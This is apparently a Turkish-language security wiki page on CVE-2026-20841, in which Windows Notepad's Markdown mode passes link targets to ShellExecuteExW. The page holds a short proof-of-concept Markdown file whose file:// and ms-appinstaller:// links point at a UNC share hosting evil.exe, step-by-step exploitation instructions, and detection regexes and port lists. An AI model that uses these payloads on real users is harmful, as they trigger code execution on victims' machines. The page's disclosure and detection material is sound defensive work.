# Windows Protocol Handler / ShellExecute Kötüye Kullanımı (Markdown İşleyicileri)

{{#include ../banners/hacktricks-training.md}}

Markdown veya HTML işleyen Windows uygulamaları, tıklanan hedefleri `ShellExecuteExW` işlevine aktarabilir. ShellExecute, kayıtlı URI scheme'lerini ve dosya ilişkilendirmelerini dağıttığından, bir işleyici her bağlantının HTTP(S) olduğunu varsaymak yerine açık bir allowlist kullanmalıdır. Aşağıda açıklanan Notepad davranışı CVE-2026-20841'i tanımlar ve her işleyici için genellenmemelidir.<sup>[[1]](#references)[[3]](#references)</sup>

## Windows Notepad Markdown modundaki ShellExecuteExW yüzeyi
- Notepad, Markdown modunu yalnızca `sub_1400ED5D0()` içindeki sabit bir string karşılaştırması aracılığıyla **`.md` uzantıları** için seçer.<sup>[[1]](#references)</sup>
- Desteklenen Markdown bağlantıları:
- Standard: `[text](target)`
- Autolink: `<target>` (`[target](target)` olarak işlenir); bu nedenle payload'lar ve detections için her iki syntax da önemlidir.
- Bağlantı tıklamaları `sub_140170F60()` içinde işlenir; bu işlev zayıf bir filtering uygular ve ardından `ShellExecuteExW` çağrısı yapar.
- `ShellExecuteExW`, yalnızca HTTP(S)'e değil, **yapılandırılmış herhangi bir protocol handler'a** dispatch eder.<sup>[[1]](#references)</sup>

### Payload considerations
- Bağlantıdaki tüm `\\` dizileri, `ShellExecuteExW` çağrılmadan önce `\` olarak **normalize edilir**; bu durum UNC/path crafting ve detection'ı etkiler.
- `.md` dosyaları varsayılan olarak **Notepad ile ilişkilendirilmez**; victim yine de dosyayı Notepad'de açmalı ve bağlantıya tıklamalıdır, ancak dosya render edildikten sonra bağlantı tıklanabilir durumdadır.
- Tehlikeli örnek scheme'ler:<sup>[[1]](#references)</sup>
- Yerel/UNC payload başlatmak için `file://`.
- App Installer akışlarını tetiklemek için `ms-appinstaller://`. Yerel olarak kayıtlı diğer scheme'ler de kötüye kullanılabilir.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Exploitation akışı
1. Notepad'in Markdown olarak görüntülemesi için bir **`.md` dosyası** oluşturun.
2. Tehlikeli bir URI şeması (`file:`, `ms-appinstaller:` veya yüklü herhangi bir handler) kullanarak bir bağlantı ekleyin.
3. Dosyayı (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB veya benzeri üzerinden) gönderin ve kullanıcıyı dosyayı Notepad'de açmaya ikna edin.
4. Tıklama yapıldığında, **normalize edilmiş bağlantı** `ShellExecuteExW` işlevine aktarılır ve ilgili protocol handler, başvurulan içeriği kullanıcının bağlamında çalıştırır.<sup>[[1]](#references)[[2]](#references)</sup>

## Tespit fikirleri
- Belgeleri yaygın olarak ileten portlar/protokoller üzerinden `.md` dosyalarının aktarımını izleyin: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Markdown bağlantılarını (standart ve autolink) ayrıştırın ve **büyük/küçük harfe duyarsız** `file:` veya `ms-appinstaller:` ifadelerini arayın.
- Uzak kaynak erişimini yakalamak için vendor-guided regex'ler:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- ZDI tarafından açıklanan vendor fix, kabul edilen hedefleri yerel dosyalar ve HTTP(S) ile sınırlar. Kayıtlı attack surface sistemden sisteme değiştiğinden, gerektiğinde diğer yüklü protocol handler'lar için de detection'ları genişletin.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Windows Notepad'de Arbitrary Code Execution](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
